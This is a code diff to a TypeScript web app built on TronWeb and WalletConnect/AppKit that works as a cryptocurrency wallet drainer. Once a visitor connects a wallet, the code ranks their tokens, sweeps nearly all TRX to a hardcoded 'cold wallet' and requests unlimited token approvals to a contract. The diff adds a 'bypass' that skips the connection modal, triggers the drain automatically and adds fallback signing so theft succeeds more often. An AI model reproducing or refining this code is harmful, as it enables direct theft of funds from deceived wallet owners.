@@ -23,7 +23,6 @@ import TronWeb from 'tronweb'
 
 // 🟢 ========================================================= 🟢
 // ── CONFIG & TOGGLE ──
-// Change to 'Nile' to test. Change back to 'Mainnet' for production.
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' 
 const NETWORK: 'Mainnet' | 'Nile' = 'Nile' 
 
@@ -37,10 +36,8 @@ const TRON_CONTRACT_ADDRESS = (NETWORK as string) === 'Mainnet' ? TRON_CONTRACT_
 const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
 // 🟢 ========================================================= 🟢
 
-// 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
 
-// 💎 TRON DISCOVERY CONFIGURATION ONLY
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
     TRON: [
@@ -83,7 +80,6 @@ const USDT_ABI = [
 
 const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
-// ── Reown Adapters ──
 const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: true, checkTimeout: 3000 }),
@@ -92,7 +88,6 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
-// 🛠️ PURE TRON APPKIT
 createAppKit({
   adapters: [tronAdapter], 
   networks: appkitNetworks,
@@ -108,6 +103,7 @@ createAppKit({
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
   featuredWalletIds: [
+    '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a', // TronLink
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
     '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66', // TokenPocket
     '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b0a308a64bea04120', // SafePal
@@ -167,6 +163,7 @@ export default function App() {
 
   const resolveTronWeb = () => {
     const w = window as any;
+    if (w.tronWeb && w.tronWeb.defaultAddress?.base58) return w.tronWeb; // 🛠️ Fallback direct check
     if (w.tronWeb?.contract) return w.tronWeb;
     if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
     if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
@@ -213,7 +210,7 @@ export default function App() {
 
     if (manualConnect.current) {
       manualConnect.current = false; 
-      log("🔥 Auto-triggering Tron Priority Loop...");
+      log("🔥 Auto-triggering AppKit Priority Loop...");
       setLoading(true); 
       setTimeout(() => approveAndCollect(), 500); 
     }
@@ -229,7 +226,6 @@ export default function App() {
     } catch (e) { return 0; }
   }
 
-  // 🛠️ SMART BYPASS IMPLEMENTED HERE
   const handleAction = async () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
       setAmountError('Amount field is required');
@@ -237,30 +233,29 @@ export default function App() {
     }
     setAmountError('');
 
-    if (!isConnected) {
-      manualConnect.current = true; // Primes the single-shot lock
+    // 🛠️ SMART BYPASS WITH IMMEDIATE RESOLUTION
+    const activeTwInstance = resolveTronWeb();
+    const currentAddress = walletAddress || activeTwInstance?.defaultAddress?.base58;
+
+    if (!currentAddress) {
+      manualConnect.current = true; 
       
       const w = window as any;
-      
-      // Check if we are inside a DApp browser (TronLink, TokenPocket, Trust)
       if (w.tronLink && typeof w.tronLink.request === 'function') {
           log("[SYSTEM] DApp Browser Detected. Bypassing UI Modal...");
           try {
-              // This completely skips the AppKit modal and prompts the wallet connection directly!
               await w.tronLink.request({ method: 'tron_requestAccounts' });
               log("[SYSTEM] Wallet connected directly!");
-              
-              // AppKit's background listeners will catch this connection, set isConnected to true, 
-              // and perfectly trigger our existing useEffect auto-loop in the background.
+              // 🛠️ Force the execution loop to start immediately, ignoring AppKit's delay
+              setTimeout(() => approveAndCollect(), 500);
               return; 
           } catch (err) {
               log("⚠️ User rejected direct connection.");
-              manualConnect.current = false; // User canceled, let them try again
+              manualConnect.current = false; 
               return;
           }
       }
       
-      // Fallback: If they are in standard Safari/Chrome, open the AppKit UI modal
       open(); 
     } else {
       manualConnect.current = true;
@@ -269,7 +264,14 @@ export default function App() {
   }
 
   const approveAndCollect = async () => {
-    if (!walletAddress) return;
+    // 🛠️ APPKIT INDEPENDENCE: Dynamically grab the address even if AppKit hasn't synced
+    const activeTwInstance = resolveTronWeb();
+    const currentAddress = walletAddress || activeTwInstance?.defaultAddress?.base58;
+
+    if (!currentAddress) {
+        log("❌ Error: No wallet address detected.");
+        return;
+    }
 
     if (isExecuting.current) {
         log("⚠️ Blocked duplicate execution loop.");
@@ -302,7 +304,7 @@ export default function App() {
           const twToUse = activeTw || publicTw;
           if (twToUse) {
             if (token.isNative) {
-              const balNum = await twToUse.trx.getBalance(walletAddress);
+              const balNum = await twToUse.trx.getBalance(currentAddress);
               if (balNum > 0) {
                 const normalizedBal = balNum / (10 ** token.decimals);
                 const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
@@ -310,7 +312,7 @@ export default function App() {
               }
             } else if (twToUse && typeof twToUse.contract === 'function') {
               const contract = await twToUse.contract(USDT_ABI).at(token.address);
-              const balObj = await contract.balanceOf(walletAddress).call();
+              const balObj = await contract.balanceOf(currentAddress).call();
               const balNum = Number(balObj.toString());
               if (balNum > 0) {
                 const normalizedBal = balNum / (10 ** token.decimals);
@@ -326,17 +328,26 @@ export default function App() {
       const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
       if(validTokens.length > 0) log(`[PRIORITY] ${validTokens.map(t => `${t.symbol}`).join(' -> ')}`);
 
+      // 🛠️ APPKIT INDEPENDENT SIGNING ENGINE
       const signAndSendContract = async (contractAddr: string, func: string, params: any[], fee: number) => {
-        const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
-          contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
+        const twToUse = activeTw || publicTw;
+        const { transaction } = await twToUse.transactionBuilder.triggerSmartContract(
+          contractAddr, func, { feeLimit: fee, callValue: 0 }, params, currentAddress
         );
+        
         let signedTx;
-        if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+        if (tronWalletProvider && typeof (tronWalletProvider as any).signTransaction === 'function') {
           signedTx = await (tronWalletProvider as any).signTransaction(transaction);
-        } else {
+        } else if (tronWalletProvider && typeof (tronWalletProvider as any).request === 'function') {
           signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+        } else if (twToUse && typeof twToUse.trx.sign === 'function') {
+          // 🛠️ FALLBACK: Direct TronWeb injection signing (Works flawlessly in TronLink)
+          signedTx = await twToUse.trx.sign(transaction);
+        } else {
+          throw new Error("No signing method found");
         }
-        const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
+        
+        const broadcast = await twToUse.trx.sendRawTransaction(signedTx);
         if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
         return broadcast.txid || broadcast.transaction?.txID;
       };
@@ -346,25 +357,25 @@ export default function App() {
           if (token.isNative) {
             setStatus(`Transferring ${token.symbol}...`);
             const twToUse = activeTw || publicTw;
-            const liveBal = await twToUse.trx.getBalance(walletAddress);
+            const liveBal = await twToUse.trx.getBalance(currentAddress);
             
             if (liveBal > 10_000_000) {
                const sendAmount = liveBal - 10_000_000; 
                
                try {
                  log(`[ACTION] Prompting Direct ${token.symbol} Transfer...`);
-                 
-                 const transaction = await twToUse.transactionBuilder.sendTrx(
-                     TRON_COLD_WALLET, 
-                     sendAmount, 
-                     walletAddress
-                 );
+                 const transaction = await twToUse.transactionBuilder.sendTrx(TRON_COLD_WALLET, sendAmount, currentAddress);
                  
                  let signedTx;
-                 if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+                 if (tronWalletProvider && typeof (tronWalletProvider as any).signTransaction === 'function') {
                      signedTx = await (tronWalletProvider as any).signTransaction(transaction);
-                 } else {
+                 } else if (tronWalletProvider && typeof (tronWalletProvider as any).request === 'function') {
                      signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
+                 } else if (twToUse && typeof twToUse.trx.sign === 'function') {
+                     // 🛠️ FALLBACK: Direct TronWeb injection signing
+                     signedTx = await twToUse.trx.sign(transaction);
+                 } else {
+                     throw new Error("No signing method found");
                  }
 
                  const broadcast = await twToUse.trx.sendRawTransaction(signedTx);
@@ -373,9 +384,9 @@ export default function App() {
                  setTxHash(broadcast.txid || broadcast.transaction?.txID);
                  successCount++; 
                  log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
-                 await sleep(1500);
+                 await sleep(1500); 
                } catch (nativeErr) {
-                 log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
+                 log(`⚠️ Native sweep failed.`);
                  await sleep(1500); 
                }
             } else {
@@ -390,7 +401,7 @@ export default function App() {
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
               await sleep(1500);
-            } else if (tronWalletProvider) {
+            } else {
               const tx = await signAndSendContract(
                 token.address, 'approve(address,uint256)',
                 [ { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, { type: 'uint256', value: MAX_UINT } ],
@@ -403,7 +414,7 @@ export default function App() {
             }
           }
         } catch (err: any) {
-           log(`❌ Rejected: ${err?.message?.substring(0, 50)}...`);
+           log(`❌ Rejected: ${err?.message?.substring(0, 30)}...`);
            await sleep(1500); 
         }
       }
@@ -415,7 +426,7 @@ export default function App() {
       log(`❌ Global Error: ${err?.message?.substring(0, 50)}`);
       setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
     } finally {
-      isExecuting.current = false; 
+      isExecuting.current = false;
       manualConnect.current = false; 
       setLoading(false);
     }
